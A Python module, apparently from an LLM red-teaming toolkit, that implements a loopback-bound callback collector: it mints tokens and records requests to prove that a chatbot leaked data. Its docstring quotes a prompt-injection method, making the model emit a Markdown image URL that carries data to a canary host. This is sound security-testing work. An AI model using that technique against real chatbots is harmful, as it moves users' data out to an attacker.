"""A listener that records the target phoning home, so exfiltration is provable.

config/skills/llm-prompt-injection.md already states the proof standard for data
exfiltration through a chatbot:

    If replies render Markdown/HTML, make it emit `![a](https://<canary-host>/p?d=<token>)`
    and headless_browser the reply: proof is the client's outbound GET, not the text.

Nothing implemented the canary host, so that proof was unavailable and the whole
class of finding -- by some distance the most consequential thing a prompt
injection can do, because it moves data out rather than merely embarrassing the
bot -- could only ever be reported as "the model emitted a URL". Which proves the
model emitted a string.

This is the host. It mints unguessable tokens, serves anything, records every
request as content-addressed evidence, and answers one question: did something
actually fetch that URL? A hit is the target's OWN traffic, which is why
`EvidenceStrength.CALLBACK` sits second only to a seeded canary.

It binds loopback by default and is gated by the ``out_of_band_callback``
capability, because a collector reachable from the internet is a service the
operator is running on someone else's behalf, and that is a decision for an
engagement to sign rather than for a tool to assume.
"""
from __future__ import annotations

import json
import secrets
import threading
import time
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Self
from urllib.parse import urlparse

from sunflower_stem.evidence.store import EvidenceStore
from sunflower_stem.schemas.evidence import EvidenceKind

#: The capability an engagement must switch on before a collector may bind
#: anything other than loopback. Enforced in `CallbackCollector.start`.
CALLBACK_CAPABILITY = "out_of_band_callback"


class CollectorRefused(PermissionError):
    """A bind this engagement has not signed for."""


def _is_loopback(host: str) -> bool:
    """Loopback, or a name for it. An empty host binds every interface, so it is not.

    `0.0.0.0` and `::` are the dangerous spellings and the easy ones to type: they
    read like "the default" and mean "every interface this machine has".
    """
    import ipaddress

    name = (host or "").strip().lower()
    if name in ("localhost", "localhost.localdomain"):
        return True
    try:
        return ipaddress.ip_address(name).is_loopback
    except ValueError:
        return False


class _Handler(BaseHTTPRequestHandler):
    """Answers everything, records everything. The response does not matter."""

    collector: CallbackCollector

    def log_message(self, *a):
        pass        # the access log is the evidence store, not stderr

    def _record(self, method: str) -> None:
        try:
            self.collector._note(method=method, path=self.path,
                                 headers=dict(self.headers.items()),
                                 client=self.client_address[0])
        except Exception:  # noqa: BLE001,S110 - a collector must never break a run
            pass
        body = b"ok"
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if method != "HEAD":
                self.wfile.write(body)
        except Exception:  # noqa: BLE001,S110 - the client may have gone already
            pass

    def do_GET(self):
        self._record("GET")

    def do_HEAD(self):
        self._record("HEAD")

    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length", 0) or 0)
            if n:
                self.rfile.read(min(n, 65536))
        except Exception:  # noqa: BLE001,S110 - a malformed body is not our problem
            pass
        self._record("POST")


class CallbackCollector:
    """Mint tokens, serve them, and record who fetched them.

    Token-scoped rather than one big log: a run tests many cases concurrently, and
    "something hit the collector" is not evidence for any particular one. The token
    is what ties a hit to the case that planted it, and it is
    ``secrets.token_hex`` precisely so the target cannot produce one by guessing.
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 0,
                 store: EvidenceStore | None = None,
                 inventory=None) -> None:
        self.host = host
        self.port = port
        self.store = store
        #: The scope document, when binding anything but loopback. See `start`.
        self.inventory = inventory
        self._server: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None
        self._hits: dict[str, list[dict]] = {}
        self._labels: dict[str, str] = {}
        self._lock = threading.Lock()

    # ----- lifecycle -----

    def start(self) -> CallbackCollector:
        """Bind and serve. A non-loopback bind needs the engagement to have signed.

        The gate this module's docstring has always claimed. It declares
        `CALLBACK_CAPABILITY` and says the collector "is gated by" it, and nothing
        read the constant -- so `CallbackCollector(host="0.0.0.0").start()` bound
        every interface with no scope document consulted, which is the one thing the
        docstring promised it would not do. A routable collector is a service the
        operator runs on someone else's behalf, and that is a decision for an
        engagement to sign rather than for a tool to assume.

        Fail-closed: with no inventory, only loopback. Every caller in this package
        binds loopback, so the gate costs them nothing and the one that does not is
        the one that has to produce the signature.
        """
        if self._server is not None:
            return self
        if not _is_loopback(self.host) and not self._signed_for_callback():
            raise CollectorRefused(
                f"refusing to bind {self.host}: a collector reachable from outside "
                f"this machine needs {CALLBACK_CAPABILITY!r} enabled on the "
                f"engagement's inventory, and "
                + ("this inventory does not enable it"
                   if self.inventory is not None else "no inventory was passed"))
        handler = type("_BoundHandler", (_Handler,), {"collector": self})
        self._server = ThreadingHTTPServer((self.host, self.port), handler)
        self.port = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever,
                                        name="callback-collector", daemon=True)
        self._thread.start()
        return self

    def _signed_for_callback(self) -> bool:
        enabled = getattr(self.inventory, "capability_enabled", None)
        return bool(enabled(CALLBACK_CAPABILITY)) if enabled else False

    def stop(self) -> None:
        srv, self._server = self._server, None
        if srv is not None:
            srv.shutdown()
            srv.server_close()
        if self._thread is not None:
            self._thread.join(timeout=5)
            self._thread = None

    def __enter__(self) -> Self:
        return self.start()

    def __exit__(self, *exc) -> None:
        self.stop()

    @property
    def running(self) -> bool:
        return self._server is not None

    @property
    def netloc(self) -> str:
        """host:port, for the browser's allow-list and for a case's seeds."""
        return f"{self.host}:{self.port}"

    # ----- tokens -----

    def mint(self, label: str = "") -> str:
        """A token the target cannot guess, tied to the case that planted it."""
        token = secrets.token_hex(12)
        with self._lock:
            self._hits[token] = []
            self._labels[token] = label
        return token

    def url_for(self, token: str) -> str:
        return f"http://{self.netloc}/c/{token}"

    def hits(self, token: str) -> list[dict]:
        with self._lock:
            return list(self._hits.get(token, []))

    def wait_for(self, token: str, timeout: float = 10.0,
                 poll_s: float = 0.05) -> list[dict]:
        """Block until this token is hit, or give up.

        A rendered reply fetches asynchronously, so checking once immediately after
        the render is a race the collector loses. Returning [] on timeout rather
        than raising keeps "nothing phoned home" an ordinary result, which is what
        it is for most cases.
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            got = self.hits(token)
            if got:
                return got
            time.sleep(poll_s)
        return self.hits(token)

    def tokens(self) -> list[str]:
        with self._lock:
            return list(self._hits)

    # ----- recording -----

    def _note(self, *, method: str, path: str, headers: dict, client: str) -> None:
        token = self._token_in(path)
        hit = {"method": method, "path": path, "client": client,
               # Split out because the query string IS the exfiltrated data: a bare
               # fetch can be a link preview, a fetch carrying a query carried
               # something out. The corpus's `require_query` rubrics turn on this.
               "query": urlparse(path).query or "",
               "at": datetime.now(UTC).isoformat(),
               "headers": {k: v for k, v in headers.items()
                           if k.lower() in ("user-agent", "referer", "host",
                                            "accept", "origin")},
               "evidence_refs": []}
        if self.store is not None:
            try:
                item = self.store.put_item(
                    json.dumps(hit, sort_keys=True).encode(),
                    kind=EvidenceKind.CALLBACK, produced_by="callback_collector",
                    target=client, meta={"token": token or "",
                                         "label": self._labels.get(token or "", "")})
                hit["evidence_refs"] = [item.sha256]
            except Exception:  # noqa: BLE001,S110 - never break on the recording path
                pass
        with self._lock:
            if token is None:
                # An unknown token is not our evidence. Recording it against some
                # arbitrary case would manufacture a callback nobody planted, so it
                # is counted and dropped -- a scan hitting the port is noise, and
                # noise that becomes evidence is worse than noise.
                self._unknown = getattr(self, "_unknown", 0) + 1
                return
            self._hits.setdefault(token, []).append(hit)

    def _token_in(self, path: str) -> str | None:
        """Which minted token this request names, if any."""
        probe = (urlparse(path).path or "") + "?" + (urlparse(path).query or "")
        with self._lock:
            for token in self._hits:
                if token in probe:
                    return token
        return None

    @property
    def unknown_hits(self) -> int:
        """Requests naming no minted token. Visible so a noisy port is explicable."""
        return getattr(self, "_unknown", 0)
